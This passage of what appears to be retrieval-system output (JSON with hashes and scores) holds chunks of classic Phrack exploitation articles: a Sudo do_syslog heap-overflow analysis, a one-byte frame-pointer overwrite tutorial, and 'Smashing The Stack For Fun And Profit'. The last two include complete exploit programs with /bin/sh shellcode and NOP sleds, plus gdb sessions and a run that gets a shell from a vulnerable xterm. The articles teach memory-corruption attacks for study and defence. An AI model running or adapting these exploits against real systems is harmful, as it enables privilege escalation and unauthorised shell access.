cannot control its exact position if it solely relies on the content of the msg buffer, and thus cannot control where the NUL byte is written. - tmp comes from line[4] if there is no SPACE character among the first MAXSYSLOGLEN bytes after p. tmp is then equal to (p + MAXSYSLOGLEN). -- If p and tmp are both located within the msg buffer, there is no possible memory corruption, because overwriting the tmp character located within a buffer returned by malloc is a perfectly legal action. -- If p is located within the msg buffer and tmp is located outside the msg buffer... this is impossible because the NUL terminator at the end of the msg buffer, placed between p and tmp, prevents do_syslog() from successfully passing the test[2] (and the code at line[8] is not interesting because it performs no write operation). Moreover, if the test[2] fails once it will always fail, because p will never be modifed again and strlen(p) will therefore stay less than or equal to MAXSYSLOGLEN, forcing do_syslog() to run the code at line[8] again and again, as long as count does not reach (strlen(msg)/MAXSYSLOGLEN + 1). -- If p and tmp are both located outside the msg buffer, p points to the first SPACE character encountered after the end of the msg string because it was pushed outside the msg buffer by the loop[7]. If the Sudo exploit exclusively relies on the content of the msg buffer, it cannot control p because it cannot control the occurrence of SPACE characters after the end of the msg string. Consequently, it cannot control tmp, which points to the place where the NUL byte is written, because tmp depends on p. Moreover, after p was pushed outside the msg buffer by the loop[7], there should be no NUL character between p and (p + MAXSYSLOGLEN) in order to successfully pass the test[2]. The Sudo exploit should once again rely on the content of the memory after msg. ----[ 2.4 - Temporary conclusion ]-------------------------------------- The Sudo exploit should: - overwrite a byte of the boundary tag located after the msg buffer with the NUL byte... it should therefore control the content of the",
                      "hash": "935d7ba1c763c863e07287a5774bc29442014d65c9759d1e30eb477ab9b35747",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8128548860549927
                    }
                  ]
                }
              ],
              "error": null
            }
          ]
        ]
      ],
      [
        ["map", "LOOP"],
        [
          [
            {
              "value": [
                {
                  "created": 1679370756816,
                  "document_id": "phrack-55-8",
                  "timestamp": 936835200000,
                  "tags": ["phrack", "issue-55", "article-8"],
                  "hash": "a799c192ad5ae7ce7cc7cfa7cc7f051c51b78119bd15d8b8f5461f46147bb643",
                  "text_size": 18611,
                  "chunk_count": 2,
                  "chunks": [
                    {
                      "text": "-------[ Phrack Magazine --- Vol. 9 | Issue 55 --- 09.09.99 --- 08 of 19 ] -------------------------[ The Frame Pointer Overwrite ] --------[ klog <klog@promisc.org> ] ----[ Introduction Buffers can be overflowed, and by overwriting critical data stored in the target process's address space, we can modify its execution flow. This is old news. This article is not much about how to exploit buffer overflows, nor does it explain the vulnerability itself. It just demonstrates it is possible to exploit such a vulnerability even under the worst conditions, like when the target buffer can only be overflowed by one byte. Many other esoteric techniques where the goal is to exploit trusted processes in the most hostile situations exist, including when privileges are dropped. We will only cover the one byte overflow here. ----[ The object of our attack Lets write a pseudo vulnerable suid program, which we will call \"suid\". It is written such that only one byte overflows from its buffer. ipdev:~/tests$ cat > suid.c #include <stdio.h> func(char *sm) { char buffer[256]; int i; for(i=0;i<=256;i++) buffer[i]=sm[i]; } main(int argc, char *argv[]) { if (argc < 2) { printf(\"missing args\\n\"); exit(-1); } func(argv[1]); } ^D ipdev:~/tests$ gcc suid.c -o suid ipdev:~/tests$ As you can see, we won't have much space to exploit this program. In fact, the overflow is caused only by one byte exceeding the buffer's storage space. We will have to use this byte cleverly. Before exploiting anything, we should take a look at what this byte really overwrites (you probably already know it, but hell, who cares). Let's reassemble the stack using gdb, at the moment the overflow occurs. ipdev:~/tests$ gdb ./suid ... (gdb) disassemble func Dump of assembler code for function func: 0x8048134 <func>: pushl %ebp 0x8048135 <func+1>: movl %esp,%ebp 0x8048137 <func+3>: subl $0x104,%esp 0x804813d <func+9>: nop 0x804813e <func+10>: movl $0x0,0xfffffefc(%ebp) 0x8048148 <func+20>: cmpl $0x100,0xfffffefc(%ebp) 0x8048152 <func+30>: jle 0x8048158 <func+36> 0x8048154 <func+32>: jmp 0x804817c <func+72> 0x8048156 <func+34>: leal (%esi),%esi 0x8048158 <func+36>: leal 0xffffff00(%ebp),%edx 0x804815e <func+42>: movl %edx,%eax 0x8048160 <func+44>: addl 0xfffffefc(%ebp),%eax 0x8048166 <func+50>: movl 0x8(%ebp),%edx 0x8048169 <func+53>: addl 0xfffffefc(%ebp),%edx 0x804816f <func+59>: movb (%edx),%cl 0x8048171 <func+61>: movb %cl,(%eax) 0x8048173 <func+63>: incl 0xfffffefc(%ebp) 0x8048179 <func+69>: jmp 0x8048148 <func+20> 0x804817b <func+71>: nop 0x804817c <func+72>: movl %ebp,%esp 0x804817e <func+74>: popl %ebp 0x804817f <func+75>: ret End of assembler dump. (gdb) As we all know, the processor will first push %eip into the stack, as the CALL instruction requires. Next, our small program pushes %ebp over it, as seen at *0x8048134. Finally, it activates a local frame by decrementing %esp by 0x104. This means our local variables will be 0x104 bytes big (0x100 for the string, 0x004 for the integer). Please note that the variables are physically padded to the first 4 bytes, so a 255 byte buffer would take up as much space as a 256 byte buffer. We can now tell what our stack looked like before the overflow occurred: saved_eip saved_ebp char buffer[255] char buffer[254] ... char buffer[000] int i This means that the overflowing byte will overwrite the saved frame pointer, which was pushed into the stack at the beginning of func(). But how can this byte be used to modify the programs execution flow? Let's take a look at what happens with %ebp's image. We already know that it is restored at the end of func(), as we can see at *0x804817e. But what next? (gdb) disassemble main Dump of assembler code for function main: 0x8048180 <main>: pushl %ebp 0x8048181 <main+1>: movl %esp,%ebp 0x8048183 <main+3>: cmpl $0x1,0x8(%ebp) 0x8048187 <main+7>: jg 0x80481a0 <main+32> 0x8048189 <main+9>: pushl $0x8058ad8 0x804818e <main+14>: call 0x80481b8 <printf> 0x8048193 <main+19>: addl $0x4,%esp 0x8048196 <main+22>: pushl $0xffffffff 0x8048198 <main+24>: call 0x804d598 <exit> 0x804819d <main+29>: addl $0x4,%esp 0x80481a0 <main+32>: movl 0xc(%ebp),%eax 0x80481a3 <main+35>: addl $0x4,%eax 0x80481a6 <main+38>: movl (%eax),%edx 0x80481a8 <main+40>: pushl %edx 0x80481a9 <main+41>: call 0x8048134 <func> 0x80481ae <main+46>: addl $0x4,%esp 0x80481b1 <main+49>: movl %ebp,%esp 0x80481b3 <main+51>: popl %ebp 0x80481b4 <main+52>: ret 0x80481b5 <main+53>: nop 0x80481b6 <main+54>: nop 0x80481b7 <main+55>: nop End of assembler dump. (gdb) Great! After func() has been called, at the end of main(), %ebp will be restored into %esp, as seen at *0x80481b1. This means that we can set %esp to an arbitrary value. But remember, this arbitrary value is not *really* arbitrary, since you can only modify the last %esp's byte. Let's check to see if we're right. (gdb) disassemble main Dump of assembler code for function main: 0x8048180 <main>: pushl %ebp 0x8048181 <main+1>: movl %esp,%ebp 0x8048183 <main+3>: cmpl $0x1,0x8(%ebp) 0x8048187 <main+7>: jg 0x80481a0 <main+32> 0x8048189 <main+9>: pushl $0x8058ad8 0x804818e <main+14>: call 0x80481b8 <printf> 0x8048193 <main+19>: addl $0x4,%esp 0x8048196 <main+22>: pushl $0xffffffff 0x8048198 <main+24>: call 0x804d598 <exit> 0x804819d <main+29>: addl $0x4,%esp 0x80481a0 <main+32>: movl 0xc(%ebp),%eax 0x80481a3 <main+35>: addl $0x4,%eax 0x80481a6 <main+38>: movl (%eax),%edx 0x80481a8 <main+40>: pushl %edx 0x80481a9 <main+41>: call 0x8048134 <func> 0x80481ae <main+46>: addl $0x4,%esp 0x80481b1 <main+49>: movl %ebp,%esp 0x80481b3 <main+51>: popl %ebp 0x80481b4 <main+52>: ret 0x80481b5 <main+53>: nop 0x80481b6 <main+54>: nop 0x80481b7 <main+55>: nop End of assembler dump. (gdb) break *0x80481b4 Breakpoint 2 at 0x80481b4 (gdb) run `overflow 257` Starting program: /home/klog/tests/suid `overflow 257` Breakpoint 2, 0x80481b4 in main () (gdb) info register esp esp 0xbffffd45 0xbffffd45 (gdb) It seems we were. After overflowing the buffer by one 'A' (0x41), %ebp is moved into %esp, which is incremented by 4 since %ebp is poped from the stack just before the RET. This gives us 0xbffffd41 + 0x4 = 0xbffffd45. ----[ Getting prepared What does changing the stack pointer give us? We cannot change the saved %eip value directly like in any conventional buffer overflow exploitation, but we can make the processor think it is elsewhere. When the processor returns from a procedure, it only pops the first word on the stack, guessing it is the original %eip. But if we alter %esp, we can make the processor pop any value from the stack as if it was %eip, and thus changing the execution flow. Lets project to overflow the buffer using the following string: [nops][shellcode][&shellcode][%ebp_altering_byte] In order to do this, we should first determine what value we want to alter %ebp (and thus %esp) with. Let's take a look at what the stack will look like when the buffer overflow will have occurred: saved_eip saved_ebp (altered by 1 byte) &shellcode \\ shellcode | char buffer nops / int i Here, we want %esp to point to &shellcode, so that the shellcode's address will be poped into %eip when the processor will return from main(). Now that we have the full knowledge of how we want to exploit our vulnerable program, we need to extract information from the process while running in the context it will be while being exploited. This information consists of the address of the overflowed buffer, and the address of the pointer to our shellcode (&shellcode). Let's run the program as if we wanted to overflow it with a 257 bytes string. In order to do this, we must write a fake exploit which will reproduce the context in which we exploit the vulnerable process. (gdb) q ipdev:~/tests$ cat > fake_exp.c #include <stdio.h> #include <unistd.h> main() { int i; char buffer[1024]; bzero(&buffer, 1024); for (i=0;i<=256;i++) { buffer[i] = 'A'; } execl(\"./suid\", \"suid\", buffer, NULL); } ^D ipdev:~/tests$ gcc fake_exp.c -o fake_exp ipdev:~/tests$ gdb --exec=fake_exp --symbols=suid ... (gdb) run Starting program: /home/klog/tests/exp2 Program received signal SIGTRAP, Trace/breakpoint trap. 0x8048090 in ___crt_dummy__ () (gdb) disassemble func Dump of assembler code for function func: 0x8048134 <func>: pushl %ebp 0x8048135 <func+1>: movl %esp,%ebp 0x8048137 <func+3>: subl $0x104,%esp 0x804813d <func+9>: nop 0x804813e <func+10>: movl $0x0,0xfffffefc(%ebp) 0x8048148 <func+20>: cmpl $0x100,0xfffffefc(%ebp) 0x8048152 <func+30>: jle 0x8048158 <func+36> 0x8048154 <func+32>: jmp 0x804817c <func+72> 0x8048156 <func+34>: leal (%esi),%esi 0x8048158 <func+36>: leal 0xffffff00(%ebp),%edx 0x804815e <func+42>: movl %edx,%eax 0x8048160 <func+44>: addl 0xfffffefc(%ebp),%eax 0x8048166 <func+50>: movl 0x8(%ebp),%edx 0x8048169 <func+53>: addl 0xfffffefc(%ebp),%edx 0x804816f <func+59>: movb (%edx),%cl 0x8048171 <func+61>: movb %cl,(%eax) 0x8048173 <func+63>: incl 0xfffffefc(%ebp) 0x8048179 <func+69>: jmp 0x8048148 <func+20> 0",
                      "hash": "332f2e71e662a5d098b07e64e27512764f8699a81ac8193f0c898f465bf6b321",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8391035795211792
                    }
                  ]
                },
                {
                  "created": 1679370616656,
                  "document_id": "phrack-49-14",
                  "timestamp": 847411200000,
                  "tags": ["phrack", "issue-49", "article-14"],
                  "hash": "b7aea9739a629c340ac066eefccb8d887d9e57732920a78d99b249932e50c6be",
                  "text_size": 60947,
                  "chunk_count": 5,
                  "chunks": [
                    {
                      "text": ".oO Phrack 49 Oo. Volume Seven, Issue Forty-Nine File 14 of 16 BugTraq, r00t, and Underground.Org bring you XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Smashing The Stack For Fun And Profit XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX by Aleph One aleph1@underground.org `smash the stack` [C programming] n. On many C implementations it is possible to corrupt the execution stack by writing past the end of an array declared auto in a routine. Code that does this is said to smash the stack, and can cause return from the routine to jump to a random address. This can produce some of the most insidious data-dependent bugs known to mankind. Variants include trash the stack, scribble the stack, mangle the stack; the term mung the stack is not used, as this is never done intentionally. See spam; see also alias bug, fandango on core, memory leak, precedence lossage, overrun screw. Introduction ~~~~~~~~~~~~ Over the last few months there has been a large increase of buffer overflow vulnerabilities being both discovered and exploited. Examples of these are syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at, etc. This paper attempts to explain what buffer overflows are, and how their exploits work. Basic knowledge of assembly is required. An understanding of virtual memory concepts, and experience with gdb are very helpful but not necessary. We also assume we are working with an Intel x86 CPU, and that the operating system is Linux. Some basic definitions before we begin: A buffer is simply a contiguous block of computer memory that holds multiple instances of the same data type. C programmers normally associate with the word buffer arrays. Most commonly, character arrays. Arrays, like all variables in C, can be declared either static or dynamic. Static variables are allocated at load time on the data segment. Dynamic variables are allocated at run time on the stack. To overflow is to flow, or fill over the top, brims, or bounds. We will concern ourselves only with the overflow of dynamic buffers, otherwise known as stack-based buffer overflows. Process Memory Organization ~~~~~~~~~~~~~~~~~~~~~~~~~~~ To understand what stack buffers are we must first understand how a process is organized in memory. Processes are divided into three regions: Text, Data, and Stack. We will concentrate on the stack region, but first a small overview of the other regions is in order. The text region is fixed by the program and includes code (instructions) and read-only data. This region corresponds to the text section of the executable file. This region is normally marked read-only and any attempt to write to it will result in a segmentation violation. The data region contains initialized and uninitialized data. Static variables are stored in this region. The data region corresponds to the data-bss sections of the executable file. Its size can be changed with the brk(2) system call. If the expansion of the bss data or the user stack exhausts available memory, the process is blocked and is rescheduled to run again with a larger memory space. New memory is added between the data and stack segments. /------------------\\ lower | | memory | Text | addresses | | |------------------| | (Initialized) | | Data | | (Uninitialized) | |------------------| | | | Stack | higher | | memory \\------------------/ addresses Fig. 1 Process Memory Regions What Is A Stack? ~~~~~~~~~~~~~~~~ A stack is an abstract data type frequently used in computer science. A stack of objects has the property that the last object placed on the stack will be the first object removed. This property is commonly referred to as last in, first out queue, or a LIFO. Several operations are defined on stacks. Two of the most important are PUSH and POP. PUSH adds an element at the top of the stack. POP, in contrast, reduces the stack size by one by removing the last element at the top of the stack. Why Do We Use A Stack? ~~~~~~~~~~~~~~~~~~~~~~ Modern computers are designed with the need of high-level languages in mind. The most important technique for structuring programs introduced by high-level languages is the procedure or function. From one point of view, a procedure call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack. The stack is also used to dynamically allocate the local variables used in functions, to pass parameters to the functions, and to return values from the function. The Stack Region ~~~~~~~~~~~~~~~~ A stack is a contiguous block of memory containing data. A register called the stack pointer (SP) points to the top of the stack. The bottom of the stack is at a fixed address. Its size is dynamically adjusted by the kernel at run time. The CPU implements instructions to PUSH onto and POP off of the stack. The stack consists of logical stack frames that are pushed when calling a function and popped when returning. A stack frame contains the parameters to a function, its local variables, and the data necessary to recover the previous stack frame, including the value of the instruction pointer at the time of the function call. Depending on the implementation the stack will either grow down (towards lower memory addresses), or up. In our examples we'll use a stack that grows down. This is the way the stack grows on many computers including the Intel, Motorola, SPARC and MIPS processors. The stack pointer (SP) is also implementation dependent. It may point to the last address on the stack, or to the next free available address after the stack. For our discussion we'll assume it points to the last address on the stack. In addition to the stack pointer, which points to the top of the stack (lowest numerical address), it is often convenient to have a frame pointer (FP) which points to a fixed location within a frame. Some texts also refer to it as a local base pointer (LB). In principle, local variables could be referenced by giving their offsets from SP. However, as words are pushed onto the stack and popped from the stack, these offsets change. Although in some cases the compiler can keep track of the number of words on the stack and thus correct the offsets, in some cases it cannot, and in all cases considerable administration is required. Futhermore, on some machines, such as Intel-based processors, accessing a variable at a known distance from SP requires multiple instructions. Consequently, many compilers use a second register, FP, for referencing both local variables and parameters because their distances from FP do not change with PUSHes and POPs. On Intel CPUs, BP (EBP) is used for this purpose. On the Motorola CPUs, any address register except A7 (the stack pointer) will do. Because the way our stack grows, actual parameters have positive offsets and local variables have negative offsets from FP. The first thing a procedure must do when called is save the previous FP (so it can be restored at procedure exit). Then it copies SP into FP to create the new FP, and advances SP to reserve space for the local variables. This code is called the procedure prolog. Upon procedure exit, the stack must be cleaned up again, something called the procedure epilog. The Intel ENTER and LEAVE instructions and the Motorola LINK and UNLINK instructions, have been provided to do most of the procedure prolog and epilog work efficiently. Let us see what the stack looks like in a simple example: example1.c: ------------------------------------------------------------------------------ void function(int a, int b, int c) { char buffer1[5]; char buffer2[10]; } void main() { function(1,2,3); } ------------------------------------------------------------------------------ To understand what the program does to call function() we compile it with gcc using the -S switch to generate assembly code output: $ gcc -S -o example1.s example1.c By looking at the assembly language output we see that the call to function() is translated to: pushl $3 pushl $2 pushl $1 call function This pushes the 3 arguments to function backwards into the stack, and calls function(). The instruction 'call' will push the instruction pointer (IP) onto the stack. We'll call the saved IP the return address (RET). The first thing done in function is the procedure prolog: pushl %ebp movl %esp,%ebp subl $20,%esp This pushes EBP, the frame pointer, onto the stack. It then copies the current SP onto EBP, making it the new FP pointer. We'll call the saved FP pointer SFP. It then allocates space for the local variables by subtracting their size from SP. We must remember that memory can only be addressed in multiples of the word size. A word in our case is 4 bytes, or 32 bits. So our 5 byte buffer is really going to take 8 bytes (2 words) of memory, and our 10 byte buffer is going to take 12 bytes (3 words) of memory. That is why SP is being subtracted by 20. With that in mind our stack looks like this when function() is called (each space represents a byte): bottom of top of memory memory buffer2 buffer1 sfp ret a b c <------ [ ][ ][ ][ ][ ][ ][ ] top of bottom of stack stack Buffer Overflows ~~~~~~~~~~~~~~~~ A buffer overflow is the result of stuffing more data into a buffer than it can handle. How can this often found programming error can be taken advantage to execute arbitrary code? Lets look at another example: example2.c ------------------------------------------------------------------------------ void function(char *str) { char buffer[16]; strcpy(buffer,str); } void main() { char large_string[256]; int i; for( i = 0; i < 255; i++) large_string[i] = 'A'; function(large_string); } ------------------------------------------------------------------------------ This is program has a function with a typical buffer overflow coding error. The function copies a supplied string without bounds checking by using strcpy() instead of strncpy(). If you run this program you will get a segmentation violation. Lets see what its stack looks when we call function: bottom of top of memory memory buffer sfp ret *str <------ [ ][ ][ ][ ] top of bottom of stack stack What is going on here? Why do we get a segmentation violation? Simple. strcpy() is coping the contents of *str (larger_string[]) into buffer[] until a null character is found on the string. As we can see buffer[] is much smaller than *str. buffer[] is 16 bytes long, and we are trying to stuff it with 256 bytes. This means that all 250 bytes after buffer in the stack are being overwritten. This includes the SFP, RET, and even *str! We had filled large_string with the character 'A'. It's hex character value is 0x41. That means that the return address is now 0x41414141. This is outside of the process address space. That is why when the function returns and tries to read the next instruction from that address you get a segmentation violation. So a buffer overflow allows us to change the return address of a function. In this way we can change the flow of execution of the program. Lets go back to our first example and recall what the stack looked like: bottom of top of memory memory buffer2 buffer1 sfp ret a b c <------ [ ][ ][ ][ ][ ][ ][ ] top of bottom of stack stack Lets try to modify our first example so that it overwrites the return address, and demonstrate how we can make it execute arbitrary code. Just before buffer1[] on the stack is SFP, and before it, the return address. That is 4 bytes pass the end of buffer1[]. But remember that buffer1[] is really 2 word so its 8 bytes long. So the return address is 12 bytes from the start of buffer1[]. We'll modify the return value in such a way that the assignment statement 'x = 1;' after the function call will be jumped. To do so we add 8 bytes to the return address. Our code is now: example3.c: ------------------------------------------------------------------------------ void function(int a, int b, int c) { char buffer1[5]; char buffer2[10]; int *ret; ret = buffer1 + 12; (*ret) += 8; } void main() { int x; x = 0; function(1,2,3); x = 1; printf(\"%d\\n\",x); } ------------------------------------------------------------------------------ What we have done is add 12 to buffer1[]'s address. This new address is where the return address is stored. We want to skip pass the assignment to the printf call. How did we know to add 8 to the return address? We used a test value first (for example 1), compiled the program, and then started gdb: ------------------------------------------------------------------------------ [aleph1]$ gdb example3 GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... (gdb) disassemble main Dump of assembler code for function main: 0x8000490 <main>: pushl %ebp 0x8000491 <main+1>: movl %esp,%ebp 0x8000493 <main+3>: subl $0x4,%esp 0x8000496 <main+6>: movl $0x0,0xfffffffc(%ebp) 0x800049d <main+13>: pushl $0x3 0x800049f <main+15>: pushl $0x2 0x80004a1 <main+17>: pushl $0x1 0x80004a3 <main+19>: call 0x8000470 <function> 0x80004a8 <main+24>: addl $0xc,%esp 0x80004ab <main+27>: movl $0x1,0xfffffffc(%ebp) 0x80004b2 <main+34>: movl 0xfffffffc(%ebp),%eax 0x80004b5 <main+37>: pushl %eax 0x80004b6 <main+38>: pushl $0x80004f8 0x80004bb <main+43>: call 0x8000378 <printf> 0x80004c0 <main+48>: addl $0x8,%esp 0x80004c3",
                      "hash": "9bd0e3932da0892fa6336ca4a122fe4f03a452070695e691dda38af2398eb919",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8326839208602905
                    },
                    {
                      "text": "define DEFAULT_BUFFER_SIZE 512 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr += 4; for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ Now we can try to guess what the buffer and offset should be: ------------------------------------------------------------------------------ [aleph1]$ ./exploit2 500 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG [aleph1]$ exit [aleph1]$ ./exploit2 600 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG Illegal instruction [aleph1]$ exit [aleph1]$ ./exploit2 600 100 Using address: 0xbffffd4c [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit [aleph1]$ ./exploit2 600 200 Using address: 0xbffffce8 [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit . . . [aleph1]$ ./exploit2 600 1564 Using address: 0xbffff794 [aleph1]$ ./vulnerable $EGG $ ------------------------------------------------------------------------------ As we can see this is not an efficient process. Trying to guess the offset even while knowing where the beginning of the stack lives is nearly impossible. We would need at best a hundred tries, and at worst a couple of thousand. The problem is we need to guess *exactly* where the address of our code will start. If we are off by one byte more or less we will just get a segmentation violation or a invalid instruction. One way to increase our chances is to pad the front of our overflow buffer with NOP instructions. Almost all processors have a NOP instruction that performs a null operation. It is usually used to delay execution for purposes of timing. We will take advantage of it and fill half of our overflow buffer with them. We will place our shellcode at the center, and then follow it with the return addresses. If we are lucky and the return address points anywhere in the string of NOPs, they will just get executed until they reach our code. In the Intel architecture the NOP instruction is one byte long and it translates to 0x90 in machine code. Assuming the stack starts at address 0xFF, that S stands for shell code, and that N stands for a NOP instruction the new stack would look like this: bottom of DDDDDDDDEEEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of memory 89ABCDEF0123456789AB CDEF 0123 4567 89AB CDEF memory buffer sfp ret a b c <------ [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE] ^ | |_____________________| top of bottom of stack stack The new exploits is then: exploit3.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define NOP 0x90 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; for (i = 0; i < bsize/2; i++) buff[i] = NOP; ptr = buff + ((bsize/2) - (strlen(shellcode)/2)); for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ A good selection for our buffer size is about 100 bytes more than the size of the buffer we are trying to overflow. This will place our code at the end of the buffer we are trying to overflow, giving a lot of space for the NOPs, but still overwriting the return address with the address we guessed. The buffer we are trying to overflow is 512 bytes long, so we'll use 612. Let's try to overflow our test program with our new exploit: ------------------------------------------------------------------------------ [aleph1]$ ./exploit3 612 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG $ ------------------------------------------------------------------------------ Whoa! First try! This change has improved our chances a hundredfold. Let's try it now on a real case of a buffer overflow. We'll use for our demonstration the buffer overflow on the Xt library. For our example, we'll use xterm (all programs linked with the Xt library are vulnerable). You must be running an X server and allow connections to it from the localhost. Set your DISPLAY variable accordingly. ------------------------------------------------------------------------------ [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit3 1124 Using address: 0xbffffdb4 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"^1FF V 1@/bin/sh ^C [aleph1]$ exit [aleph1]$ ./exploit3 2148 100 Using address: 0xbffffd48 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"^1FF V 1@/bin/shHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH HHHHHHHHHHHH Warning: some arguments in previous message were lost Illegal instruction [aleph1]$ exit . . . [aleph1]$ ./exploit4 2148 600 Using address: 0xbffffb54 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"^1FF V 1@/bin/shTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT TTTTTTTTTTTT Warning: some arguments in previous message were lost bash$ ------------------------------------------------------------------------------ Eureka! Less than a dozen tries and we found the magic numbers. If xterm where installed suid root this would now be a root shell. Small Buffer Overflows ~~~~~~~~~~~~~~~~~~~~~~ There will be times when the buffer you are trying to overflow is so small that either the shellcode wont fit into it, and it will overwrite the return address with instructions instead of the address of our code, or the number of NOPs you can pad the front of the string with is so small that the chances of guessing their address is minuscule. To obtain a shell from these programs we will have to go about it another way. This particular approach only works when you have access to the program's environment variables. What we will do is place our shellcode in an environment variable, and then overflow the buffer with the address of this variable in memory. This method also increases your changes of the exploit working as you can make the environment variable holding the shell code as large as you want. The environment variables are stored in the top of the stack when the program is started, any modification by setenv() are then allocated elsewhere. The stack at the beginning then looks like this: <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp> Our new program will take an extra variable, the size of the variable containing the shellcode and NOPs. Our new exploit now looks like this: exploit4.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define DEFAULT_EGG_SIZE 2048 #define NOP 0x90 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_esp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr, *egg; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i, eggsize=DEFAULT_EGG_SIZE; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (argc > 3) eggsize = atoi(argv[3]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } if (!(egg = malloc(eggsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_esp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr = egg; for (i = 0; i < eggsize - strlen(shellcode) - 1; i++) *(ptr++) = NOP; for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; egg[eggsize - 1] = '\\0'; memcpy(egg,\"EGG=\",4); putenv(egg); memcpy(buff,\"RET=\",4); putenv(buff); system(\"/bin/bash\"); } 